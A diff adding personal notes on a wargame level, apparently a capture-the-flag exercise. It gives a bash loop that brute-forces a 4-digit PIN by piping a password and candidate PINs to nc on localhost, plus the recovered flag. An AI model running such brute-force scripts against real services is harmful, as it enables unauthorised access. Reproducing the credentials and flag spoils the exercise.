@@ -1,0 +1,16 @@
+#Bruteforcing a 4 digit pin.. not so hard?!?
+# Many MANY problems... even playing script kiddy didnt work
+# server was to quickly timing out.
+# Eventually script below worked (checking pins between 8000 and 9000)
+# I believe it was someware at 8007 orso...
+
+#!/bin/bash
+
+for i in {8000..9000}; do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002
+
+END
+
+flag:
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
